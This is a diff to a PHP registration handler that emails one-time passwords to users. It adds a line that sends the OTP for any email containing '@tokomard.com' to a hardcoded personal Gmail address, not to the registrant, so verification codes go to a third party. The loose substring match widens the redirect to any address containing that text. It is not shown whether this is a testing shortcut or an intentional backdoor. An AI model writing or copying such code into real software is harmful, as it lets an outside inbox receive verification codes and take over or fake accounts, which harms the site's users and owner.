@@ -51,10 +51,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && empty($_P
     ]);
 
     try {
+	$target_email = strpos($email, '@tokomard.com') !== false ? 'yudistrmaulanaptr@gmail.com' : $email;
         $client->post('emails', [
             'json' => [
                 'from' => 'Tokomard Panel <noreply@tokomard.store>', // HARUS verified
-                'to' => [$email],
+                'to' => [$target_email],
                 'subject' => 'Kode OTP Pendaftaran',
                 'html' => "<h3>Kode OTP Anda: <strong>$otp</strong></h3><p>Jangan bagikan ke siapa pun. Berlaku 5 menit.</p>",
             ]
